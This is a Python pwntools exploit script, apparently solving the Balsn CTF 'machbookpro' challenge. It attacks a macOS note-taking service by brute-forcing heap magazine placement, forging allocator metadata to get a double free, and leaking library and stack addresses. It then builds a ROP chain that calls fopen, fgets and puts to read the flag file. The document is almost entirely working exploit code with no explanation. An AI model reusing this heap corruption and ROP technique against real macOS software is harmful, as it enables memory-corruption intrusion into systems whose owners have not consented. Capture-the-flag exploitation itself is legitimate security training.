#!/usr/bin/env python

import sys
from pwn import *

def create(idx, title, sz, data):
    r.sendlineafter('> ', '1')
    r.sendlineafter('index: ', str(idx))
    r.sendafter('title: ', title)
    r.sendlineafter('size: ', str(sz))
    r.sendafter('content: ', data)

def readp(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('index: ', str(idx))

def editp(idx, data):
    r.sendlineafter('> ', '3')
    r.sendlineafter('index: ', str(idx))
    r.sendafter('content: ', data)

def deletep(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('index: ', str(idx))

if len(sys.argv) == 1:
    _REMOTE_ = False
else:
    _REMOTE_ = True

while True:
    try:
        if not _REMOTE_:
            r = remote('localhost', 19091)
        else:
            r = remote('machbookpro.balsnctf.com', 19091)

        create(0, 'a'*0x10, 0xe0, 'a'*0x20)

        readp(0)
        r.recvuntil('title: ' + 'a'*0x10)
        heap = u64(r.recv(6).ljust(8, '\x00'))
        log.success('heap: ' + hex(heap))

        ### allocating 0x4080+0xe0 might be in the same magazine (1/16 probability)
        if heap & 0xffff != 0x4160:
            log.failure('Heap not in same magazine')
            r.close()
            continue

        heap_base = heap & 0xfffffff00000
        post_ptr = heap - 0xe0
        log.success('found post_ptr heap base: ' + hex(heap_base))

        bitmap_offset = (heap & 0xfffff - (0x100000 - 64504*0x10)) / 0x10
        offset = bitmap_offset / 0x20
        pos = bitmap_offset % 0x20
        log.info('offset/pos: {}/{}'.format(offset, pos))

        cnt = 1

        while cnt < 7:
            create(cnt, 'A'*0x10, 0x100, 'A'*0x10)
            readp(cnt)
            r.recvuntil('title: ' + 'A'*0x10)
            tmp = u64(r.recv(6).ljust(8, '\x00'))
            if tmp & 0xfffffff00000 == heap_base:
                if cnt == 6:
                    corrupted_heap = tmp
                    log.success('corrupted_heap: ' + hex(corrupted_heap))
                cnt += 1
            else:
                deletep(cnt)

        deletep(6)
        deletep(0)

        fake_metadata1 = 0x1000100030001000
        fake_metadata2 = 0x0000000000000000

        # The exploit will only success if this allocate post[0] (1/4 probability)
        create(-514, p64(fake_metadata1) + p64(fake_metadata2), 0xe0, 'deadbeef')
        deletep(6)

        usable = [0, 6]

        idx = usable.pop(0)
        tmp = 0
        while tmp != corrupted_heap:
            create(idx, 'B'*0x10, 0x100, p64(post_ptr) + p64((post_ptr+0x50) >> 4))
            readp(idx)
            r.recvuntil('title: ' + 'B'*0x10)
            tmp = u64(r.recv(6).ljust(8, '\x00'))
            print idx, hex(tmp)
            if tmp & 0xfffffff00000 != heap_base:
                deletep(idx)
            elif tmp != corrupted_heap:
                log.failure('Double free failed...')
                r.close()
                continue

        ### Brute force 1/16 for checksum
        idx = usable.pop(0)
        tmp = 0
        while tmp != corrupted_heap:
            create(idx, 'C'*0x10, 0x100, 'C'*0x10)
            readp(idx)
            r.recvuntil('title: ' + 'C'*0x10)
            tmp = u64(r.recv(6).ljust(8, '\x00'))
            print idx, hex(tmp)
            if tmp & 0xfffffff00000 != heap_base:
                deletep(idx)
            elif tmp != corrupted_heap:
                log.failure('Double free failed...')
                r.close()
                continue

        log.success('Double free success!')
        break
    except EOFError:
        r.close()
        continue

first_tiny_heap = heap_base - (((heap_base >> 20) & 0xf) % 4) * 0x100000

editp(2, 'D'*0x10 + p64(first_tiny_heap+0x4448))
readp(0)
r.recvuntil('content: ')
libdispatch = u64(r.recv(8)) - 0x126d0
log.success('libdispatch: ' + hex(libdispatch))

editp(2, 'D'*0x10 + p64(libdispatch+0x38))
readp(0)
r.recvuntil('content: ')
libc_data = u64(r.recv(8)) - 0x2240
log.success('libc_data: ' + hex(libc_data))

editp(2, 'D'*0x10 + p64(libc_data+0x3888) + p64(0x100) + 'D'*0x10 + p64(libc_data+0x2228))
readp(0)
r.recvuntil('content: ')
libc_code = u64(r.recv(8)) - 0x8bc4
log.success('libc_code: ' + hex(libc_code))

readp(1)
r.recvuntil('content: ')
libdyld = u64(r.recv(8)) - 0x3670
log.success('libdyld: ' + hex(libdyld))
environ = libdyld + 0x3668

editp(2, 'D'*0x10 + p64(environ))
readp(0)
r.recvuntil('content: ')
stack = u64(r.recv(8))
log.success('stack: ' + hex(stack))

val = 0
while val & 0xfff != 0xcc9:
    editp(2, 'D'*0x10 + p64(stack) + p64(0x200))
    readp(0)
    r.recvuntil('content: ')
    val = u64(r.recv(8))
    stack -= 8

editp(2, 'D'*0x10 + p64(stack) + p64(0x200))
log.success('rbp_ret_address: ' + hex(stack))

# ROP
'''
0x0000000000001e66: pop rdi; pop rbp; ret;
0x0000000000002495: pop rsi; pop rbp; ret; 
0x0000000000001e67: pop rbp; ret;
0x00000000000680a6: mov rdx, rax; call qword ptr [rbp - 0x60];
'''

pop_rdi = libc_code+0x1e66
pop_rsi = libc_code+0x2495
pop_rbp = libc_code+0x1e67
ret = libc_code+0x1e68
mov_rdx_rax = libc_code+0x680a6

fopen = libc_code+0x39fe9
fgets = libc_code+0x3948a
puts = libc_code+0x3f630

flag_offset = stack+0x100
if not _REMOTE_:
    flagname = './flag\x00r\x00'
else:
    flagname = '/Users/ctf/machbookpro/flag\x00r\x00'

_rop = p64(ret)
_rop += p64(pop_rdi) + p64(flag_offset) + p64(0)
_rop += p64(pop_rsi) + p64(flag_offset+len(flagname)-2) + p64(0)
_rop += p64(fopen)
_rop += p64(pop_rbp) + p64(stack+8*11+0x60)
_rop += p64(mov_rdx_rax) + p64(pop_rsi)
_rop += p64(pop_rdi) + p64(stack+0x200) + p64(0)
_rop += p64(pop_rsi) + p64(0x100) + p64(0)
_rop += p64(fgets)
_rop += p64(pop_rdi) + p64(stack+0x200) + p64(0)
_rop += p64(puts)
_rop = _rop.ljust(0x100, '\x00') + flagname

editp(0, _rop)

# trigger ROP
r.sendlineafter('> ', '5')
r.recvuntil('bye~\n')
print r.recvline().strip()

r.close()
